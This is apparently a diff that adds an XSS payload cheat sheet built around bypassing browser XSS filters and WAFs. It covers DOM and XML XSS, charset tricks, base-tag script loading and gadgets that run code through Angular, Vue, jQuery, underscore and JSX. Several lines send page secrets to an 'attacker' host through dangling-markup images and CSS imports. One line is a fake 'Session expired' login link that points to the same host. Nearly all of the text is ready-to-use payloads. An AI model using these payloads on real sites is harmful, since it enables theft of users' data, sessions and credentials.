@@ -1,0 +1,58 @@
+Refer to https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet for more on each payload
+
+//DOM XSS (can be triggered depending on context)
+<body><script>hash=location.hash.slice(1);document.body.innerHTML=decodeURIComponent(hash);</script></body> <script>var q="";alert(1)//"</script>
+<script>location.href=decodeURIComponent(location.hash.slice(1));</script>
+
+//XML XSS
+<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>
+<?xml version="1.0"?><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
+
+// exfiltrate data to our domain:
+<p><img src="https://attacker/?data=</p>
+<p>This is a secret text.</p>
+<p id="x">AAA</p>
+
+// can also exfiltrate data on a sensitive page using css:
+<style>@import '//attacker/test.css'</style>
+<link rel=stylesheet href=//attacker/test.css>
+
+
+//Script loaded using relative URL (same impact as script src but much more likely to pass thru waf):
+<div><base href=//cors.l0.cm/</div><script src=/test.js></script>
+
+//ISO-2022-jp chars
+<meta charset=iso-2022-jp><svg o[0x1B](Bnload=alert(1)>
+<meta charset=iso-2022-jp><script>alert(1)[0x1B]$@[0x0A]</script>
+
+//file upload if the user uploaded files are on same origin
+<script src=/bypass/usercontent/xss.js></script>
+<link rel=import href=/bypass/usercontent/icon.jpg>
+
+//Angular is hosted or is loaded from a CORS enabled CDN:
+<script src="/js/angular1.6.4.min.js"></script><p ng-app>{{constructor.constructor('alert(1)')()}}
+<link rel=import href=angular.html><p ng-app>{{constructor.constructor('alert(1)')()}}
+
+//Vue.js is hosts or loaded from cors enabled cdn: 
+<link rel=import href=/bypass/vue.html><div id=app>{{constructor.constructor('alert(1)')()}}
+
+//jquery is hosted or loaded from cors enabled cdn: 
+<link rel=import href=/bypass/jquery.html><p class=container></p><form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
+<form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
+
+//underscore.js hosts or loaded from cors cdn:
+<link rel=import href=/bypass/underscore.html><script id=template>//<%alert`1`%></script>
+
+//JSX transformation script hosted or loaded: 
+<link rel=import href=/bypass/babel-standalone.html><svg><script type=text/jsx>//<!--alert(1)//--></svg><script>0</script>
+
+
+
+
+<a href="javascript:alert(1)">Link</a>
+<div>`-alert(1)</script><script>`</div>
+<div>`-alert(1)</script><script>`</div>
+<svg o<script>nload=alert(1)>
+<script>/&/-alert(1)</script>
+<a href=https://attacker/>Session expired. Please login again.</a>
+<x~onfocus=alert(1) id=a tabindex=0>
